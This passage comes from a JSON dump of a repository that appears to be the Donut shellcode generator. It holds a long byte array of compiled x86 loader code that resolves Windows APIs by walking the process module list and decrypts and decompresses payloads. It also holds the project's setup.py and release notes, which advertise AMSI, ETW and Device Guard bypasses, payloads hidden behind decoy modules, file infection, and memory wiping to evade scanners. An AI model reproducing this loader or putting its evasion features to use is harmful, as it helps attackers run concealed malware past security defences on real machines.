0x8b, 0x44, 0x24, 0x18, 0x8b, 0x40, \n  0x04, 0x8b, 0x54, 0x24, 0x14, 0x89, 0x06, 0xe9, 0xff, 0xfe, 0xff, 0xff, \n  0x8b, 0x3f, 0x8d, 0x83, 0x70, 0x03, 0x00, 0x00, 0x83, 0x7f, 0x18, 0x00, \n  0x0f, 0x85, 0xe7, 0xfe, 0xff, 0xff, 0x5f, 0x5e, 0x33, 0xc0, 0x5d, 0x40, \n  0x5b, 0x81, 0xc4, 0x94, 0x00, 0x00, 0x00, 0xc3, 0x8b, 0x44, 0x24, 0x04, \n  0x68, 0x00, 0x01, 0x00, 0x00, 0xff, 0x74, 0x24, 0x10, 0x6a, 0xff, 0xff, \n  0x74, 0x24, 0x14, 0x6a, 0x00, 0x6a, 0x00, 0xff, 0x50, 0x50, 0xc3, 0xe8, \n  0x00, 0x00, 0x00, 0x00, 0x58, 0x83, 0xe8, 0x05, 0xc3, 0x55, 0x8b, 0xec, \n  0x8b, 0x55, 0x0c, 0x83, 0xec, 0x40, 0x33, 0xc9, 0x53, 0x56, 0x83, 0xcb, \n  0xff, 0x57, 0x38, 0x0a, 0x74, 0x16, 0x8d, 0x75, 0xc0, 0x2b, 0xf2, 0x83, \n  0xf9, 0x40, 0x73, 0x0c, 0x8a, 0x02, 0x41, 0x88, 0x04, 0x16, 0x42, 0x80, \n  0x3a, 0x00, 0x75, 0xef, 0x80, 0x7c, 0x0d, 0xbc, 0x2e, 0xc6, 0x44, 0x0d, \n  0xc0, 0x00, 0x74, 0x0d, 0xc7, 0x44, 0x0d, 0xc0, 0x2e, 0x64, 0x6c, 0x6c, \n  0xc6, 0x44, 0x0d, 0xc4, 0x00, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x8b, \n  0x40, 0x30, 0x8b, 0x40, 0x0c, 0x8b, 0x78, 0x0c, 0x8b, 0x77, 0x18, 0x85, \n  0xf6, 0x74, 0x31, 0x8b, 0x46, 0x3c, 0x8b, 0x4c, 0x30, 0x78, 0x33, 0xc0, \n  0x85, 0xc9, 0x74, 0x1a, 0x8b, 0x44, 0x31, 0x0c, 0x03, 0xc6, 0x50, 0x8d, \n  0x45, 0xc0, 0x50, 0xe8, 0x57, 0x06, 0x00, 0x00, 0x8b, 0xd8, 0x33, 0xc0, \n  0x59, 0x59, 0x85, 0xdb, 0x74, 0x19, 0x8b, 0x3f, 0x85, 0xdb, 0x75, 0xcc, \n  0x85, 0xc0, 0x75, 0x0a, 0x8d, 0x45, 0xc0, 0x50, 0x8b, 0x45, 0x08, 0xff, \n  0x50, 0x30, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0xc6, 0xeb, 0xf7, 0x81, \n  0xec, 0x90, 0x00, 0x00, 0x00, 0x53, 0x55, 0x56, 0x57, 0x8b, 0xbc, 0x24, \n  0xa8, 0x00, 0x00, 0x00, 0x33, 0xf6, 0x85, 0xff, 0x0f, 0x84, 0x33, 0x01, \n  0x00, 0x00, 0x8b, 0x4f, 0x3c, 0x89, 0x4c, 0x24, 0x18, 0x8b, 0x44, 0x39, \n  0x78, 0x85, 0xc0, 0x0f, 0x84, 0x20, 0x01, 0x00, 0x00, 0x8d, 0x1c, 0x38, \n  0x8b, 0x43, 0x20, 0x8b, 0x53, 0x1c, 0x03, 0xc7, 0x89, 0x44, 0x24, 0x10, \n  0x03, 0xd7, 0x8b, 0x43, 0x24, 0x03, 0xc7, 0x89, 0x54, 0x24, 0x1c, 0x39, \n  0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x0f, 0x84, 0xe5, 0x00, 0x00, 0x00, \n  0x8b, 0x6b, 0x18, 0x85, 0xed, 0x0f, 0x84, 0xee, 0x00, 0x00, 0x00, 0x8d, \n  0x04, 0x68, 0x83, 0xc0, 0xfe, 0x89, 0x44, 0x24, 0x14, 0x8b, 0x44, 0x24, \n  0x10, 0x8d, 0x04, 0xa8, 0x83, 0xc0, 0xfc, 0x89, 0x44, 0x24, 0x10, 0x8b, \n  0x00, 0xff, 0xb4, 0x24, 0xac, 0x00, 0x00, 0x00, 0x03, 0xc7, 0x50, 0xe8, \n  0x80, 0x05, 0x00, 0x00, 0x59, 0x59, 0x85, 0xc0, 0x75, 0x10, 0x8b, 0x44, \n  0x24, 0x14, 0x8b, 0x4c, 0x24, 0x1c, 0x0f, 0xb7, 0x00, 0x8b, 0x34, 0x81, \n  0x03, 0xf7, 0x8b, 0x44, 0x24, 0x10, 0x83, 0x6c, 0x24, 0x14, 0x02, 0x83, \n  0xe8, 0x04, 0x89, 0x44, 0x24, 0x10, 0x83, 0xed, 0x01, 0x74, 0x04, 0x85, \n  0xf6, 0x74, 0xc0, 0x8b, 0x4c, 0x24, 0x18, 0x3b, 0xf3, 0x72, 0x76, 0x8b, \n  0x44, 0x39, 0x7c, 0x03, 0xc3, 0x3b, 0xf0, 0x73, 0x6c, 0x33, 0xc9, 0x38, \n  0x0e, 0x74, 0x1d, 0x8d, 0x5c, 0x24, 0x20, 0x8b, 0xd6, 0x2b, 0xde, 0x83, \n  0xf9, 0x3c, 0x73, 0x10, 0x8a, 0x02, 0x88, 0x04, 0x13, 0x3c, 0x2e, 0x74, \n  0x07, 0x41, 0x42, 0x80, 0x3a, 0x00, 0x75, 0xeb, 0xc7, 0x44, 0x0c, 0x21, \n  0x64, 0x6c, 0x6c, 0x00, 0x33, 0xd2, 0x41, 0x03, 0xce, 0x38, 0x11, 0x74, \n  0x17, 0x8d, 0x74, 0x24, 0x60, 0x2b, 0xf1, 0x83, 0xfa, 0x3f, 0x73, 0x0c, \n  0x8a, 0x01, 0x42, 0x88, 0x04, 0x0e, 0x41, 0x80, 0x39, 0x00, 0x75, 0xef, \n  0x8d, 0x44, 0x24, 0x60, 0xc6, 0x44, 0x14, 0x60, 0x00, 0x50, 0x8d, 0x44, \n  0x24, 0x24, 0x50, 0x57, 0xff, 0xb4, 0x24, 0xb0, 0x00, 0x00, 0x00, 0xe8, \n  0xd4, 0xe2, 0xff, 0xff, 0x83, 0xc4, 0x10, 0x8b, 0xf0, 0x8b, 0xc6, 0xeb, \n  0x16, 0x8b, 0x84, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x2b, 0x43, 0x10, 0x8b, \n  0x34, 0x82, 0x03, 0xf7, 0xe9, 0x6e, 0xff, 0xff, 0xff, 0x33, 0xc0, 0x5f, \n  0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0x90, 0x00, 0x00, 0x00, 0xc3, 0x55, 0x8b, \n  0xec, 0x64, 0xa1, 0x18, 0x00, 0x00, 0x00, 0x33, 0xc9, 0x56, 0x8b, 0x40, \n  0x30, 0x8b, 0x40, 0x0c, 0x8b, 0x70, 0x0c, 0xeb, 0x20, 0x85, 0xc9, 0x75, \n  0x23, 0xff, 0x75, 0x18, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, \n  0x0c, 0x50, 0xff, 0x75, 0x08, 0xe8, 0xd5, 0xe0, 0xff, 0xff, 0x8b, 0x36, \n  0x83, 0xc4, 0x18, 0x8b, 0xc8, 0x8b, 0x46, 0x18, 0x85, 0xc0, 0x75, 0xd9, \n  0x8b, 0xc1, 0x5e, 0x5d, 0xc3, 0x83, 0xec, 0x14, 0x53, 0x8b, 0x5c, 0x24, \n  0x24, 0x33, 0xc0, 0x55, 0x56, 0x33, 0xed, 0x89, 0x44, 0x24, 0x0c, 0x57, \n  0x8b, 0x7c, 0x24, 0x2c, 0x33, 0xf6, 0x89, 0x74, 0x24, 0x2c, 0x8b, 0x4c, \n  0x24, 0x28, 0x8a, 0x0c, 0x08, 0x84, 0xc9, 0x74, 0x1e, 0x83, 0xf8, 0x40, \n  0x74, 0x19, 0x88, 0x4c, 0x2c, 0x14, 0x45, 0x40, 0x89, 0x7c, 0x24, 0x2c, \n  0x89, 0x44, 0x24, 0x10, 0x89, 0x74, 0x24, 0x2c, 0x83, 0xfd, 0x10, 0x75, \n  0x6f, 0xeb, 0x54, 0x6a, 0x10, 0x58, 0x2b, 0xc5, 0x8d, 0x74, 0x24, 0x14, \n  0x50, 0x03, 0xf5, 0x6a, 0x00, 0x56, 0xe8, 0xfc, 0x03, 0x00, 0x00, 0x83, \n  0xc4, 0x0c, 0xc6, 0x06, 0x80, 0x83, 0xfd, 0x0c, 0x72, 0x21, 0x53, 0x8d, \n  0x44, 0x24, 0x18, 0x57, 0x50, 0xe8, 0x56, 0x00, 0x00, 0x00, 0x6a, 0x10, \n  0x33, 0xf8, 0x33, 0xda, 0x8d, 0x44, 0x24, 0x24, 0x6a, 0x00, 0x50, 0xe8, \n  0xd3, 0x03, 0x00, 0x00, 0x83, 0xc4, 0x18, 0x8b, 0x44, 0x24, 0x10, 0x8b, \n  0x74, 0x24, 0x2c, 0xc1, 0xe0, 0x03, 0x46, 0x89, 0x44, 0x24, 0x20, 0x89, \n  0x74, 0x24, 0x2c, 0x53, 0x8d, 0x44, 0x24, 0x18, 0x57, 0x50, 0xe8, 0x21, \n  0x00, 0x00, 0x00, 0x33, 0xf8, 0x83, 0xc4, 0x0c, 0x8b, 0x44, 0x24, 0x10, \n  0x33, 0xda, 0x33, 0xed, 0x85, 0xf6, 0x0f, 0x84, 0x62, 0xff, 0xff, 0xff, \n  0x8b, 0xc7, 0x8b, 0xd3, 0x5f, 0x5e, 0x5d, 0x5b, 0x83, 0xc4, 0x14, 0xc3, \n  0x83, 0xec, 0x10, 0x8b, 0x44, 0x24, 0x18, 0x8b, 0x54, 0x24, 0x1c, 0x53, \n  0x55, 0x56, 0x8b, 0x74, 0x24, 0x20, 0x33, 0xdb, 0x57, 0x8d, 0x7c, 0x24, \n  0x10, 0xa5, 0xa5, 0xa5, 0xa5, 0x8b, 0x4c, 0x24, 0x14, 0x8b, 0x74, 0x24, \n  0x1c, 0x8b, 0x6c, 0x24, 0x18, 0x8b, 0x7c, 0x24, 0x10, 0x89, 0x4c, 0x24, \n  0x28, 0x8b, 0xce, 0xc1, 0xc8, 0x08, 0x8b, 0x74, 0x24, 0x28, 0x03, 0xc2, \n  0xc1, 0xce, 0x08, 0x33, 0xc7, 0x03, 0xf7, 0xc1, 0xc2, 0x03, 0x33, 0xf3, \n  0xc1, 0xc7, 0x03, 0x33, 0xd0, 0x89, 0x6c, 0x24, 0x28, 0x33, 0xfe, 0x8b, \n  0xe9, 0x43, 0x83, 0xfb, 0x1b, 0x72, 0xd6, 0x5f, 0x5e, 0x5d, 0x5b, 0x83, \n  0xc4, 0x10, 0xc3, 0x8b, 0x54, 0x24, 0x10, 0x83, 0xec, 0x14, 0x53, 0x8b, \n  0x5c, 0x24, 0x20, 0x55, 0x8b, 0x6c, 0x24, 0x28, 0x85, 0xd2, 0x0f, 0x84, \n  0xec, 0x00, 0x00, 0x00, 0x33, 0xc0, 0x8d, 0x4b, 0x0f, 0x40, 0x89, 0x4c, \n  0x24, 0x2c, 0x2b, 0xc3, 0x56, 0x89, 0x44, 0x24, 0x0c, 0x57, 0x8d, 0x44, \n  0x24, 0x14, 0x3b, 0xc1, 0x77, 0x04, 0x8d, 0x44, 0x24, 0x23, 0x8b, 0xf3, \n  0x8d, 0x7c, 0x24, 0x14, 0x33, 0xc9, 0xa5, 0xa5, 0xa5, 0xa5, 0x8b, 0x74, \n  0x24, 0x28, 0x8b, 0x04, 0x8e, 0x31, 0x44, 0x8c, 0x14, 0x41, 0x83, 0xf9, \n  0x04, 0x72, 0xf3, 0x8b, 0x74, 0x24, 0x20, 0x8b, 0x44, 0x24, 0x1c, 0x8b, \n  0x7c, 0x24, 0x18, 0x8b, 0x4c, 0x24, 0x14, 0xc7, 0x44, 0x24, 0x30, 0x10, \n  0x00, 0x00, 0x00, 0x03, 0xcf, 0x03, 0xc6, 0xc1, 0xc7, 0x05, 0x33, 0xf9, \n  0xc1, 0xc6, 0x08, 0x33, 0xf0, 0xc1, 0xc1, 0x10, 0x03, 0xc7, 0x03, 0xce, \n  0xc1, 0xc7, 0x07, 0xc1, 0xc6, 0x0d, 0x33, 0xf8, 0x33, 0xf1, 0xc1, 0xc0, \n  0x10, 0x83, 0x6c, 0x24, 0x30, 0x01, 0x75, 0xd7, 0x8b, 0x5c, 0x24, 0x28, \n  0x89, 0x4c, 0x24, 0x14, 0x33, 0xc9, 0x89, 0x74, 0x24, 0x20, 0x89, 0x7c, \n  0x24, 0x18, 0x89, 0x44, 0x24, 0x1c, 0x8b, 0x04, 0x8b, 0x31, 0x44, 0x8c, \n  0x14, 0x41, 0x83, 0xf9, 0x04, 0x72, 0xf3, 0x6a, 0x10, 0x5e, 0x3b, 0xd6, \n  0x8b, 0xca, 0x0f, 0x47, 0xce, 0x85, 0xc9, 0x74, 0x15, 0x8d, 0x7c, 0x24, \n  0x14, 0x8b, 0xf5, 0x2b, 0xfd, 0x8b, 0xd9, 0x8a, 0x04, 0x37, 0x30, 0x06, \n  0x46, 0x83, 0xeb, 0x01, 0x75, 0xf5, 0x8b, 0x5c, 0x24, 0x10, 0x2b, 0xd1, \n  0x03, 0xe9, 0x8b, 0x4c, 0x24, 0x34, 0x80, 0x01, 0x01, 0x75, 0x08, 0x49, \n  0x8d, 0x04, 0x0b, 0x85, 0xc0, 0x7f, 0xf3, 0x8b, 0x5c, 0x24, 0x2c, 0x8d, \n  0x4b, 0x0f, 0x85, 0xd2, 0x0f, 0x85, 0x28, 0xff, 0xff, 0xff, 0x5f, 0x5e, \n  0x5d, 0x5b, 0x83, 0xc4, 0x14, 0xc3, 0x83, 0xec, 0x14, 0x8b, 0x4c, 0x24, \n  0x18, 0x83, 0x64, 0x24, 0x10, 0x00, 0x53, 0x55, 0x8b, 0x6c, 0x24, 0x24, \n  0x8a, 0x01, 0x56, 0x57, 0x88, 0x45, 0x00, 0x83, 0xcf, 0xff, 0x8d, 0x45, \n  0x01, 0x33, 0xf6, 0x89, 0x44, 0x24, 0x18, 0x33, 0xdb, 0x8d, 0x41, 0x01, \n  0x89, 0x5c, 0x24, 0x10, 0x89, 0x44, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x14, \n  0x50, 0xe8, 0x67, 0x01, 0x00, 0x00, 0x59, 0x85, 0xc0, 0x0f, 0x84, 0x32, \n  0x01, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x14, 0x50, 0xe8, 0x54, 0x01, 0x00, \n  0x00, 0x85, 0xc0, 0x8d, 0x44, 0x24, 0x18, 0x59, 0x50, 0x74, 0x7d, 0xe8, \n  0x45, 0x01, 0x00, 0x00, 0x59, 0x85, 0xc0, 0x74, 0x37, 0x6a, 0x04, 0x33, \n  0xf6, 0x5b, 0x8d, 0x44, 0x24, 0x14, 0x50, 0xe8, 0x31, 0x01, 0x00, 0x00, \n  0x59, 0x8d, 0x34, 0x70, 0x83, 0xeb, 0x01, 0x75, 0xed, 0x8b, 0x54, 0x24, \n  0x18, 0x85, 0xf6, 0x74, 0x0a, 0x8b, 0xc2, 0x2b, 0xc6, 0x8a, 0x00, 0x88, \n  0x02, 0xeb, 0x03, 0xc6, 0x02, 0x00, 0x8b, 0x5c, 0x24, 0x10, 0x42, 0xe9, \n  0xef, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x14, 0x8b, 0x54, 0x24, 0x18, \n  0x0f, 0xb6, 0x38, 0x40, 0x8b, 0xcf, 0x89, 0x44, 0x24, 0x14, 0x83, 0xe1, \n  0x01, 0x83, 0xc1, 0x02, 0xd1, 0xef, 0x74, 0x14, 0x8b, 0xf2, 0x2b, 0xf7, \n  0x8a, 0x06, 0x88, 0x02, 0x42, 0x46, 0x83, 0xe9, 0x01, 0x75, 0xf5, 0xe9, \n  0xa4, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x43, 0x89, 0x5c, 0x24, 0x10, 0xe9, \n  0x9c, 0x00, 0x00, 0x00, 0xe8, 0xff, 0x00, 0x00, 0x00, 0x8b, 0xd0, 0x59, \n  0x85, 0xf6, 0x75, 0x2b, 0x83, 0xfa, 0x02, 0x75, 0x26, 0x8d, 0x44, 0x24, \n  0x14, 0x50, 0xe8, 0xe9, 0x00, 0x00, 0x00, 0x8b, 0x54, 0x24, 0x1c, 0x8b, \n  0xf0, 0x59, 0x85, 0xf6, 0x74, 0x76, 0x8b, 0xca, 0x2b, 0xcf, 0x8a, 0x01, \n  0x88, 0x02, 0x42, 0x41, 0x83, 0xee, 0x01, 0x75, 0xf5, 0xeb, 0x61, 0x8b, \n  0x4c, 0x24, 0x14, 0x8d, 0x44, 0x24, 0x14, 0x83, 0xf6, 0x01, 0x2b, 0xd6, \n  0xc1, 0xe2, 0x08, 0x0f, 0xb6, 0x39, 0x81, 0xc7, 0x00, 0xfe, 0xff, 0xff, \n  0x03, 0xfa, 0x41, 0x50, 0x89, 0x4c, 0x24, 0x18, 0xe8, 0xa7, 0x00, 0x00, \n  0x00, 0x59, 0x8b, 0xc8, 0x81, 0xff, 0x00, 0x7d, 0x00, 0x00, 0x72, 0x01, \n  0x41, 0x8b, 0x54, 0x24, 0x18, 0x8d, 0x41, 0x01, 0x81, 0xff, 0x00, 0x05, \n  0x00, 0x00, 0x0f, 0x42, 0xc1, 0x81, 0xff, 0x80, 0x00, 0x00, 0x00, 0x8d, \n  0x70, 0x02, 0x0f, 0x43, 0xf0, 0x85, 0xf6, 0x74, 0x13, 0x8b, 0xca, 0x2b, \n  0xcf, 0x8a, 0x01, 0x88, 0x02, 0x42, 0x41, 0x83, 0xee, 0x01, 0x75, 0xf5, \n  0x89, 0x54, 0x24, 0x18, 0x33, 0xf6, 0x46, 0xeb, 0x18, 0x8b, 0x4c, 0x24, \n  0x14, 0x8b, 0x54, 0x24, 0x18, 0x8a, 0x01, 0x88, 0x02, 0x42, 0x41, 0x89, \n  0x4c, 0x24, 0x14, 0x33, 0xf6, 0x89, 0x54, 0x24, 0x18, 0x85, 0xdb, 0x0f, \n  0x84, 0x9b, 0xfe, 0xff, 0xff, 0x5f, 0x5e, 0x2b, 0xd5, 0x5d, 0x8b, 0xc2, \n  0x5b, 0x83, 0xc4, 0x14, 0xc3, 0x56, 0x8b, 0x74, 0x24, 0x08, 0x8b, 0x4e, \n  0x0c, 0x8d, 0x56, 0x08, 0x8d, 0x41, 0xff, 0x89, 0x46, 0x0c, 0x85, 0xc9, \n  0x75, 0x13, 0x8b, 0x0e, 0x0f, 0xb6, 0x01, 0x89, 0x02, 0x8d, 0x41, 0x01, \n  0x89, 0x06, 0xc7, 0x46, 0x0c, 0x07, 0x00, 0x00, 0x00, 0x8b, 0x02, 0x5e, \n  0x8d, 0x0c, 0x00, 0xc1, 0xe8, 0x07, 0x89, 0x0a, 0x83, 0xe0, 0x01, 0xc3, \n  0x56, 0x33, 0xf6, 0x46, 0xff, 0x74, 0x24, 0x08, 0xe8, 0xbc, 0xff, 0xff, \n  0xff, 0xff, 0x74, 0x24, 0x0c, 0x8d, 0x34, 0x70, 0xe8, 0xb0, 0xff, 0xff, \n  0xff, 0x59, 0x59, 0x85, 0xc0, 0x75, 0xe5, 0x8b, 0xc6, 0x5e, 0xc3, 0x8b, \n  0x54, 0x24, 0x0c, 0x8b, 0x44, 0x24, 0x04, 0x56, 0x8b, 0xf0, 0x85, 0xd2, \n  0x74, 0x13, 0x57, 0x8b, 0x7c, 0x24, 0x10, 0x2b, 0xf8, 0x8a, 0x0c, 0x37, \n  0x88, 0x0e, 0x46, 0x83, 0xea, 0x01, 0x75, 0xf5, 0x5f, 0x5e, 0xc3, 0x8a, \n  0x44, 0x24, 0x08, 0x8b, 0x4c, 0x24, 0x0c, 0x57, 0x8b, 0x7c, 0x24, 0x08, \n  0xf3, 0xaa, 0x8b, 0x44, 0x24, 0x08, 0x5f, 0xc3, 0x8b, 0x44, 0x24, 0x04, \n  0x8b, 0x4c, 0x24, 0x08, 0x53, 0x8a, 0x10, 0x84, 0xd2, 0x74, 0x0e, 0x8a, \n  0x19, 0x84, 0xdb, 0x74, 0x08, 0x3a, 0xd3, 0x75, 0x04, 0x40, 0x41, 0xeb, \n  0xec, 0x0f, 0xbe, 0x00, 0x0f, 0xbe, 0x09, 0x2b, 0xc1, 0x5b, 0xc3, 0x8b, \n  0x54, 0x24, 0x04, 0x8b, 0x4c, 0x24, 0x08, 0x53, 0x8a, 0x02, 0x84, 0xc0, \n  0x74, 0x13, 0x8a, 0x19, 0x84, 0xdb, 0x74, 0x0d, 0x80, 0xcb, 0x20, 0x0c, \n  0x20, 0x3a, 0xc3, 0x75, 0x04, 0x42, 0x41, 0xeb, 0xe7, 0x0f, 0xbe, 0x02, \n  0x0f, 0xbe, 0x09, 0x2b, 0xc1, 0x5b, 0xc3};\n\n"
        },
        {
          "name": "pyproject.toml",
          "type": "blob",
          "size": 0,
          "content": ""
        },
        {
          "name": "setup.py",
          "type": "blob",
          "size": 1.701171875,
          "content": "from setuptools import Extension, setup\nimport sys\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nstatic_libraries   = ['aplib64']\nstatic_lib_dir     = 'lib'\nlibraries          = []\nlibrary_dirs       = ['lib']\nextra_compile_args = []\nextra_link_args    = []\nextra_objects      = []\ninclude_dirs       = ['include']\nsources            = ['donut.c', \n                      'hash.c', \n                      'encrypt.c', \n                      'format.c', \n                      'loader/clib.c', \n                      'donutmodule.c']\n\nif sys.platform == 'win32':\n    libraries.extend(static_libraries)\n    library_dirs.append(static_lib_dir)\n    extra_objects = []\nelif sys.platform == 'win64':\n    libraries.extend(static_libraries)\n    library_dirs.append(static_lib_dir)\n    extra_objects = []    \nelse: # POSIX\n    extra_objects = ['{}/{}.a'.format(static_lib_dir, l) for l in static_libraries]\n\n\nmodule = Extension(\n        \"donut\",\n        include_dirs       = include_dirs,\n        sources            = sources,\n        libraries          = libraries,\n        library_dirs       = library_dirs,\n        extra_compile_args = extra_compile_args,\n        extra_link_args    = extra_link_args,\n        extra_objects      = extra_objects,\n)\n\nsetup(\n     name='donut-shellcode',\n     version='1.1',\n     description='Donut shellcode Python C extension',\n     long_description=long_description,\n     long_description_content_type=\"text/markdown\",\n     license=\"BSD-3\",\n     author_email=\"therealwover@protonmail.com\",\n     url='https://github.com/TheWover/donut',\n     author='TheWover, Odzhan, byt3bl33d3r',\n     include_package_data=True,\n     zip_safe=True,\n     ext_modules=[module],\n     python_requires='>=3.0',\n)\n"
        },
        {
          "name": "version-release-notes.txt",
          "type": "blob",
          "size": 2.984375,
          "content": "* v0.9.1:\n  * Dual-Mode shellcode that can run in either x64 for x86 (WOW64) processes.\n  * Automatic detection of the CLR version required for .NET Assembly payloads.\n  * AMSI bypassing for version .NET 4.8 that ensure all Assemblies can be safely loaded.\n  * Modular system for adding bypasses. Your choide of bypass functionality is compiled into payload.exe based on compiler flags.\n  * Bypass for Device Guard policy preventing execution of dynamically generated .NET code\n  * Better handling of Main functions (Entry Points) that use an object array containing string arrays, rather than an array of strings\n* v1.0:\n  * Added module overloading for native PE payloads. Hides them in MEM_IMAGE memory backed by a decoy file on disk\n  * Added an option to block indefinitely after running the payload\n  * Added Dockerfile to create a docker image for generating donut shellcode\n  * Added support for binaries without relocation information or with certain edge cases for relocation information\n  * Added custom GetProcAddress and LoadLibrary replacement functions that will only call those Win32 API calls as fallbacks\n  * Better documentation for debugging, designing with, and integrating Donut.\n  * Added moduler bypass system for ETW\n  * Change the -y parameter to be an offset, relative to the base address of the host process's executable. This supports using donut for file infection (like BackdoorFactory).\n  * Added option for preserving or overwriting PE headers of native payloads\n  * When Module Overloading and PE header overwritten are enabled, the payload's headers will be overwritten by those of the decoy module\n  * Added support for HTTP Basic Authentication with remote modules\n  * Native PE Section permissions are more accurate\n  * Fixed some issues with the MingW makefile (#96)\n  * Fixed and improved all makefiles\n  * Added an X86 MSVC makefile (Makefile_x86.msvc) for ease of use\n  * Fixed the Python module\n  * Added an inject_local.exe that runs shellcode in the current process for testing purposes\n  * C# output generator\n  * Python output generator\n  * UUID string output generator\n  * NTHeaders->OptionalHeader->ImageBase is now updated correctly\n  * Sections' PhysicalAddress is now updated correctly\n  * Much more detailed debugging output\n  * Better wiping of data in memory to evade scanners\n  * Improved error handling\n  * Default AppDomain is now used when entropy is disabled\n  * Updated reference to go-donut\n  * Stack pointer is now correctly aligned (Kyle Willmon)\n* v1.02\n  * Fix mismatch in handling of IL_ONLY assemblies (jackullrich)\n  * Added the '_o_exit' exit API used by cmd.exe on Windows 11 (S4ntiagoP)\n  * Re-fix stack pointer alignment (wwh1004)\n  * Fixed the description of Offset Execution (-y parameter) to align with version 1.0 updates\n  * Fixed exe2h getting a buffer overflow\n  * Fixed some circular includes (MEhrn00)\n  * Fix mingw gcc builds (MEhrn00)\n  * Cast Donut_Create to PyCFunction to fix python module (jsf9k)\n  * Added a GitHub Action to build the Python package and push to PyPi\n"
        }
      ]
    }
  ]
}